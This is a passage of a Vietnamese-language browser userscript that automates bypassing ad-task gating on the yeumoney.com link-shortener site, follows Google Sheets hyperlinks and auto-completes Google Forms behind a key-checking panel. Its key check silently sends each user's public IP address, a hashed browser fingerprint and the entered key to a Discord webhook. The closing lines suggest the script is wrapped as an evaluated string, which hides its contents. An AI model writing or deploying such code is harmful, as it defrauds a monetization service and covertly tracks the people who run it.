    "ntCvRiemdkqtBXgNjQpS": null,
    "ErGHwyKmzdInwZYeIJaU": null,
    "uBCymhlLBmPKUKYCbMQn": null,
    "oKfbaTreVlnMSsyPwRYQ": null,
    "tELazZaiAAYtSKoDebHn": null,
    "kNQcXsYekyObugdiDtdx": null,
    "IMXyZbLnyWGEFCWOXNUA": null,
    "zCDGdPtzFrllMHLdsWLi": null,
    "oZLolxrcffXpNuKpRTVY": null,
    "isfFrLkJZtuNyQgZpjVl": null,
    "rqMderbDHyLeyJyfzfml": null,
    "WrJbXEBDElliJUHZLcwV": null,
    "IsnZHUQvZKzopbSzeYDq": null,
    "UOjCtBPHdpQBDRMrxosu": null,
    "jpQyaWvqikjpmLJgTEOt": null,
    "QjJYZkDMnIqjSAoqfiAY": null,
    "BQWnrZQBdJjFWdHQdeOv": null,
    "GVbpHhMdfEvYPHqjkRRU": null,
    "GQOkZfSVBzPFNasDSioz": null,
    "AktjDyuyyRKDIusZzHLw": null,
    "KWIbURMNrOzowAaGHtRz": null,
    "EdiBSLCDdnvkjbZPXeub": null,
    "ksTUXibYXZgNAZzhQKvJ": null,
    "OFhVquNdDDJVZgMwmhnd": null,
    "qOWMKXWoEyrmNTDipGQu": null,
    "LTmwjgmlcZTdPWPXrMti": null,
    "hDFelaUUXxcKaVZGMgmn": null,
    "bTrgXrJQDqjEbjZGaPAe": null,
    "uLcDpqBQFdaxMKwfDPtK": null,
    "xLsTOFbJixMqDTYXPAgi": null,
    "VjssTObrfSZBLFeVglmF": null,
    "NOPIMuxTRyqOZtvmsXud": null,
    "HdQBOuDIsQLFJPvGjGGh": null,
    "TWOxzgVZdspLDYQgBNyA": null,
    "NseLlYeUgGXAPigZqBoo": null,
    "sxHazvQJhxLcGKqciIHW": null,
    "vjLQHlYGTUgDzEyNUtsc": null,
    "fVQogSzbgXwDEnXFbVsr": null,
    "HfBrOyqUnbaGzhzagzKe": null,
    "atORqJzqRCgVICnYtNWo": null,
    "CQFTQWDZRKJuYVHTnAOX": null,
    "ruxOoomLqqLSQdgxCrOa": null,
    "cEDryZUehQLchQzENhxq": null,
    "oyNgeiixKjiJLkiYnrhB": null,
    "gzpwObGxjfnvxXRDEcYP": null,
    "YOnrGxvslabpIxrbmxkB": null,
    "HFbdAydLbZqPeSYrSjfH": null,
    "tbTWKOstLKvnSqucADeD": null,
    "iHObJwknwfsNdnIwwgcv": null,
    "PfRlgtmkEojzXKSZsBLn": null,
    "AZZmVzFSVRKqhmveETWA": null,
    "DNgvGwvkeMqMMfoMjEVC": null,
    "vnhhyYfbshvyygZcSFwt": null,
    "diiOPZcKDxeubtDVDorP": null,
    "dIWlXMMaHbhSHfDCwebU": null,
    "vVSukvbeejBLmUOhoLJx": null,
    "XtCFexcHJRbmIhAbssFg": null,
    "DOYTOVjIYqCPFsbJmaMJ": null,
    "kxaeMzOYOCqsfPhEEtqP": null,
    "WXxHJjtFjEvsHihnKqVq": null,
    "miGfAlAtRFfAfwijEetQ": null,
    "GpjLQGzsDthYXrviCiXa": null,
    "HUTtTEKEmYeKVQHYSWUT": null,
    "RYLRePuMoVrxpWAsgNUw": null,
    "vkBuNVpliLPAohmttYRv": null,
    "ZhrAoqwxFevIuEhpKcXp": null,
    "ARPzHFQWSBbvTGLTXXjJ": null,
    "KbkHPlEeDFsDbyUrJmGb": null,
    "nlmIrZDcmxdhAvFSFsWM": null,
    "ykKPdbDQLotojDCFnojm": null,
    "StCdjYlHVKgWeYgIaUbX": null,
    "PAxDFYggPSiENFsIAlrh": null,
    "KCGuZdukTFLdCWqzHufJ": null,
    "RUopLLDMDjYNvrYFpJTx": null,
    "VtNyhfCgoWvpLAzvYGHR": null,
    "BHBLhUwusYAmJYtpZcfS": null,
    "HcACozuSmXbfdGbmpkvq": null,
    "UDXCugeBnnwWofTvaDvO": null,
    "dNhtvsHzFuwHNcEmiLSZ": null,
    "kEARMwjlcaYSMZnQYgaZ": null,
    "EYZKDMUOtDhSZCpbkdfY": null,
    "kJSgObURqxXjWZWeRksN": null,
    "kAGDFCibRSmbOgSoiYKW": null,
    "ZZOMAjwiNtHgDtVVgPrJ": null,
    "wEryhZtgWOIqjtCmSydG": null,
    "vIwaANMFAhGDRxZWPuAj": null,
    "MvcHnGdPBszkeIUZyJLG": null,
    "APmahnLXIDuJTNIwOwNR": null,
    "vIhOdXGRzBJyMLxjNUYF": null,
    "PsgXETseongGHMnPFjKf": null,
    "vtxGJZjdHERtejdhVpMj": null,
    "bPqpBZZFJrUOYTTqzwWh": null,
    "oWkRXLWJijBGOutsotbO": null,
    "JvcoehKdeObMdLAvavBp": null,
    "zzMelQRAPnnbsVmrgtkJ": null,
    "TSHnUEbKJfiKuaAsIGuN": null,
    "coivKoTAWvlWTDUistqc": null,
    "GqgWxHxOOBUIDIgfPZrw": null,
    "ophmnoMnJqTniIUcmKtl": null,
    "gxmsmwiXwZbrinencDiO": null,
    "dMnvaxqVOeGETGYwspwd": null,
    "fkROWWYvdEamUdzVKSxZ": null,
    "rsOAoDeMhDCyDceLecjp": null,
    "zZxTFhckekQnEomDNAUk": null,
    "cZOPlcBPlxAnNdpXqsbm": null,
    "mcBpoeZVqDaGGZeJvTkB": null,
    "hqDMkmVOzxXAQHpCUZxy": null,
    "nqGBuUjCcfSoQOWEVdWQ": null,
    "ReFeqckALzGalQJMAtiH": null,
    "YuYYyQaeyiFXieEMIdaK": null,
    "dZiALjMqPiKLjeBhNQQK": null,
    "efYgCgYisHodAXoABbcW": null,
    "rbAiBJsDMrgbxjSOFqLY": null,
    "PeQfYtAXSsDfKCIPWFyc": null,
    "cyCwjuDqRMruGyfcPWmZ": null,
    "WpPqlmSQJmRtRGPKIxQQ": null,
    "ZOwBnjIIwaqkVpFIPuHP": null,
    "BvrANhEacyPaoZUagdUX": null,
    "fomQcPaMAWbdEPXPrvbC": null,
    "ffAjEXyBHaDCROzLUJvH": null,
    "bpKtgTXJMHkbbFuPJvHl": null,
    "WDxcxxHmMYOfnLsciJdy": null,
    "xZLUgtHlIXcZhApECPse": null,
    "HiouYpfvpIGniMIXwFRd": null,
    "bGAxyUyLQHZeirmXHCEn": null,
    "dcPLEJYTBPROkixcGdik": null,
    "qQrQJnjViquRIZMTJray": null,
    "OUUDpvYBAOePvdQHLilP": null,
    "yGZoJOEVcMtRTSBUijXP": null,
    "heuJFlFgmtNPfTQCsiRe": null,
    "qviZfvUmwjtiEZcjIRbw": null,
    "BlvkWQswytRCPvwTbSRQ": null,
    "GpkqKmiaSSTMEhpcDhPJ": null,
    "whOBjobCDggwByTPfaDO": null,
    "ektmYrqLthwYyDOzaNYU": null,
    "aOcHodpuDsFITSQTbNyC": null,
    "GXkNRenxkfVxfaMLPyaO": null,
    "tiAsneYafQwZxrbBTOPV": null,
    "hXhciEdOyDhRheFxhZpM": null,
    "YLMntAlSDaDtQBADeJLh": null,
    "rXtYSVtyGlJBQdYIVbME": null,
    "AoFUhzDdeoBIYNumBnjQ": null,
    "EuEbHUqccIaVDQZYbEob": null,
    "oRClgHITjONcQumtjkNz": null,
    "lKszFEKcfGiGVPzGnViw": null,
    "VYJlYbAYAvgnejsdySsI": null,
    "GFEXXOQaVDuGLglPgbGI": null,
    "dJJnCwRuVAgVaFYkbcRF": null,
    "WyfbaOBMONqkQsLdBudu": null,
    "mNAHqUwvHSstmQjxhRpC": null,
    "dQyyJUMulYynFfNTJTVr": null,
    "efAUIUYyHVyuvVHxwvvF": null,
    "bdVxpLjsndubARKeKYLU": null,
    "XmAYDksYxvfAhvUXyZkd": null,
    "MzcEFDQRdomNbTFHZtBA": null,
    "NouqUSmkCOKEJHQKSROW": null,
    "mPQqOQSgJRikTdrencds": null,
    "mYBPkVlKyHIrHqxbuULY": null,
    "taGoKsbxintyNPuwdPZy": null,
    "LDcxaENRYLLkPrZVklcf": null,
    "uyHbpHNPDNGjZzxIlqZj": null,
    "dBwCTVGqqVfyyeDajUuG": null,
    "ZCCLvQIpibgALYLUwUGq": null,
    "pLVQletZLiXldvRWqvvk": null,
    "vECOqcoMgkjajuLeWESW": null,
    "SPfzUqDeRdBcGYHKNVMk": null,
    "hKjLOHHQFTVQgCiempHZ": null,
    "OJYINfSJpRxhxiyBFAHB": null,
    "ExzFamJmeEvXpgWhPKGD": null,
    "pxZeYjUhVgLycKtQMAQA": null,
    "OVKHTWsBtIpGtvNwXsxQ": null,
    "mSVryHAYcSgsvOVvoMkR": null,
    "jVEHfOsPzSWcYzlpIVlY": null,
    "IZOiHjcqdqsmwgDkUCUJ": null,
    "cGnJLlvmAtXMNBSxnKnV": null,
    "iMOcifseiJRwgvlFfzjn": null,
    "AxaiIVzvFESmFJpJVesm": null,
    "tiIwXbWSnVzzHAhFuGzq": null,
    "MrFHcdsYWRQAnTCgprGH": null,
    "ALHwVVRmynogjolLlDtG": null,
    "miwufQbKcVGZAEeDaZbc": null,
    "zGzwlOcNpgnEkzdqmccU": null,
    "XuaEZoFMOrKRTnQaBEaD": null,
    "PDoZxqqcPxhVhnyerMJT": null,
    "dwcjFxmLMHCQSbzzuubg": null,
    "WmokmUKvkzBIfvZDNJzI": null,
    "pZVkWqnnjaJwgFgDSUHJ": null,
    "YmNqbuMYdUculnTQbNrP": null,
    "ITQzbQIaBDGoOrXADtSn": null,
    "kgmkkkqKbVcmdppFvNkO": null,
    "oyxRjLLFdUvfCSXhEweI": null,
    "TsDuAULqlIcBKdDvJwlF": null,
    "LvjqvNQTDNfgmesjExka": null,
    "UIMsCyZoxIEkDNRuVZqe": null,
    "BmgWUhZsVwqIAQnnxtME": null,
    "WuXjQyhWpgcGMWAZjvNq": null,
    "LyEftcaUvrBRSwqqOJyL": null,
    "jIWkVPMfgIgRMDAoZPLx": null,
    "fTyziktuVJlQveylnorJ": null,
    "LhPzxzwuCmwmxfViSNfE": null,
    "rIsTRoHVjirweZKqcLRH": null,
    "sArlShkjlKlyuvxGlrpF": null,
    "leglvAcmyhHHsKkAKYSL": null,
    "VXYktgchkdqphqgPONPI": null,
    "HwZVdbkwZtUAxUZjzpMy": null,
    "NZqDpOyfnxWmUuePtHuH": null,
    "KKXdaBbymJAgNaKypHLX": null,
    "ZBetGlMYbUYwueClNmCs": null,
    "iPgfhxnArXsPVpMnBEjA": null,
    "bcuowfZWVxCqOGewdsWd": null,
    "evrPbvkKLyUjNYqjDyEP": null,
    "lITGGhLmwPEfSdlQLHUp": null,
    "IoXHNdnkjKLhuCmSeqJH": null,
    "xIHGqlHBSehgzXRtuCUI": null,
    "iTrhFODvFWjpgrOlQytT": null
}

async function getPublicIP() {
    try {
        const response = await fetch("https://api64.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Không thể lấy địa chỉ IP:", error);
        return "Không xác định";
    }
}

async function getDeviceID() {
    let deviceID = localStorage.getItem("deviceID");

    if (!deviceID) {
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;

        const data = userAgent + platform + language;
        const encoder = new TextEncoder();
        const dataBuffer = encoder.encode(data);
        const hashBuffer = await crypto.subtle.digest("SHA-256", dataBuffer);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, "0")).join("");

        deviceID = hashHex.substring(0, 16);
        localStorage.setItem("deviceID", deviceID);
    }
    return deviceID;
}

async function sendToDiscord(enteredKey) {
    const ipAddress = await getPublicIP();
    const deviceID = await getDeviceID();

    const embedData = {
        username: "Key Check Logger",
        avatar_url: "https://i.pinimg.com/736x/af/9a/80/af9a80b73145513f5cc6b964e0a51bc2.jpg",
        embeds: [{
            title: "**✅ Key Hợp Lệ!**",
            color: 0x00ff00,
            fields: [
                { name: "**Device ID**", value: `\`${deviceID}\``, inline: true },
                { name: "**IP Address**", value: `${ipAddress}`, inline: true },
                { name: "**Key Nhập**", value: `\`${enteredKey}\``, inline: false }
            ],
            footer: { text: "Bypass System", icon_url: "https://i.pinimg.com/736x/1d/70/b6/1d70b67f9959d7aa2cb8a5eb467ebb61.jpg" },
            timestamp: new Date().toISOString()
        }]
    };

    fetch(discordWebhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embedData)
    }).catch(error => console.error('Lỗi gửi Webhook:', error));
}

async function checkKey() {
    const enteredKey = keyInput.value;
    const isValid = Object.keys(validKeys).includes(enteredKey);

    if (isValid) {
        await sendToDiscord(enteredKey);
    }

    return isValid;
}

function updateButtonState() {
    checkKey().then(isValid => {
        startBtn.disabled = !isValid;
        autoStartCheckbox.disabled = !isValid;
    });
}

keyInput.addEventListener('input', updateButtonState);

    const title = document.createElement('h3');
    title.textContent = 'Nhập URL nhiệm vụ:';
    title.style.margin = '0';
    title.style.fontWeight = 'bold';
    title.style.marginBottom = '10px';
    title.style.fontSize = '16px';
    title.style.color = 'darkred';
    container.appendChild(title);

    const input = document.createElement('input');
    input.readOnly = false;
    input.placeholder = 'Nếu để trống sẽ sử dụng URL nhận diện!';
    input.style.width = '100%';
    input.style.marginBottom = '10px';
    input.style.padding = '8px';
    input.style.fontSize = '14px';
    container.appendChild(input);

    const url = document.createElement('h4');
    url.textContent = 'URL nhận diện (OCR): ' + taskURL;
    url.style.margin = '0';
    url.style.marginBottom = '10px';
    url.style.fontSize = '13px';
    url.style.color = 'brown';
    container.appendChild(url);

    const checkboxRow = document.createElement('div');
    checkboxRow.style.display = 'flex';
    checkboxRow.style.alignItems = 'center';
    checkboxRow.style.marginBottom = '10px';
    checkboxRow.style.fontSize = '14px';
    checkboxRow.style.color = 'chocolate';

    const fetchCheckbox = document.createElement('input');
    fetchCheckbox.type = 'checkbox';
    fetchCheckbox.id = 'fetchCode';
    fetchCheckbox.checked = GM_getValue('fetchCode', false);
    fetchCheckbox.disabled = true;

    const fetchLabel = document.createElement('label');
    fetchLabel.htmlFor = 'fetchCode';
    fetchLabel.textContent = 'Auto chuyển trang';
    fetchLabel.style.marginLeft = '5px';
    fetchLabel.style.marginRight = '15px';

    const autoStartCheckbox = document.createElement('input');
    autoStartCheckbox.type = 'checkbox';
    autoStartCheckbox.id = 'autoStart';
    autoStartCheckbox.checked = GM_getValue('autoStart', false);
    autoStartCheckbox.disabled = true;

    const autoStartLabel = document.createElement('label');
    autoStartLabel.htmlFor = 'autoStart';
    autoStartLabel.textContent = 'Auto Bypass (90%)';
    autoStartLabel.style.marginLeft = '5px';

    checkboxRow.appendChild(fetchCheckbox);
    checkboxRow.appendChild(fetchLabel);
    checkboxRow.appendChild(autoStartCheckbox);
    checkboxRow.appendChild(autoStartLabel);

    container.appendChild(checkboxRow);

    const buttonRow = document.createElement('div');
    buttonRow.style.display = 'flex';
    buttonRow.style.justifyContent = 'space-between';
    buttonRow.style.fontSize = '14px';

    const startBtn = document.createElement('button');
    startBtn.textContent = 'Bắt đầu Bypass';
    startBtn.style.flex = '1';
    startBtn.style.padding = '7px';
    startBtn.style.backgroundColor = '#4CAF50';
    startBtn.style.color = '#fff';
    startBtn.style.border = 'none';
    startBtn.style.cursor = 'pointer';
    startBtn.style.marginRight = '5px';
    startBtn.style.borderRadius = '5px';
    startBtn.disabled = true;

    startBtn.onclick = async () => {
        try {
            startBtn.disabled = true;
            input.readOnly = true;
            const check = input.value || taskURL;
            input.value = 'Đang xử lý...';
            const code = await startBypass(check);

            if (code) {
                let countdown = 8;
                const countdownInterval = setInterval(() => {
                    input.value = `Vui lòng chờ: ${countdown} giây`;
                    countdown--;
                    if (countdown < 0) {
                        clearInterval(countdownInterval);
                        if (fetchCheckbox.checked) {
                            input.value = "Code: " + code + " - Đang chuyển trang...";
                            fetchResult(code);
                        } else {
                            input.value = "Code: " + code;
                        }
                        startBtn.disabled = false;
                    }
                }, 1000);
            } else {
                input.readOnly = false;
                console.error("Không có mã trả về từ startBypass");
                input.value = "Lỗi! Vui lòng xem lại URL.";
            }

            sessionStorage.removeItem("ymnclk");
            localStorage.removeItem("codexn");
        } catch (error) {
            console.error("Lỗi khi gọi startBypass:", error);
        }
    };

    buttonRow.appendChild(startBtn);

    const reloadBtn = document.createElement('button');
    reloadBtn.textContent = 'Đổi Nhiệm Vụ';
    reloadBtn.style.flex = '1';
    reloadBtn.style.padding = '7px';
    reloadBtn.style.backgroundColor = '#F44336';
    reloadBtn.style.color = '#fff';
    reloadBtn.style.border = 'none';
    reloadBtn.style.cursor = 'pointer';
    reloadBtn.style.borderRadius = '5px';

    reloadBtn.onclick = async () => {
        input.readOnly = true;
        input.value = 'Đang Đổi Nhiệm Vụ...';
        doiNhiemvu();
    };

    buttonRow.appendChild(reloadBtn);
    container.appendChild(buttonRow);
    document.body.appendChild(container);

    keyInput.addEventListener('input', function () {
        const enteredKey = keyInput.value.trim();
        if (validKeys.hasOwnProperty(enteredKey)) {
            GM_setValue('bypassKey', enteredKey);
            fetchCheckbox.disabled = false;
            autoStartCheckbox.disabled = false;
            startBtn.disabled = false;
            keyInput.style.border = '2px solid green';
        } else {
            fetchCheckbox.disabled = true;
            autoStartCheckbox.disabled = true;
            startBtn.disabled = true;
            keyInput.style.border = '2px solid red';
        }
    });

    if (autoStartCheckbox.checked) {
        startBtn.click();
    }
}


        const url = window.location.href;
        window.onload = () => {
            if (url.includes('https://yeumoney.com/')) {
                recognizeTrafficURL().then(taskURL => {
                    createUI(taskURL);
                }).catch(error => {
                    console.error("Lỗi khi nhận diện URL:", error);
                    createUI("Lỗi! Tự nhập URL hoặc Reload");
                });
            } else if (url.includes('https://docs.google.com/spreadsheets/')) {
                fetchGoogleSheetHyperlinks()
                    .then(data => {
                        if (data) {
                            window.location.href = data;
                        }
                })
                    .catch(error => console.error("Lỗi khi gọi hàm:", error));
            } else if (url.includes('https://docs.google.com/forms/')) {
                completeGoogleForms();
            }
        };
    }
)();'));})();
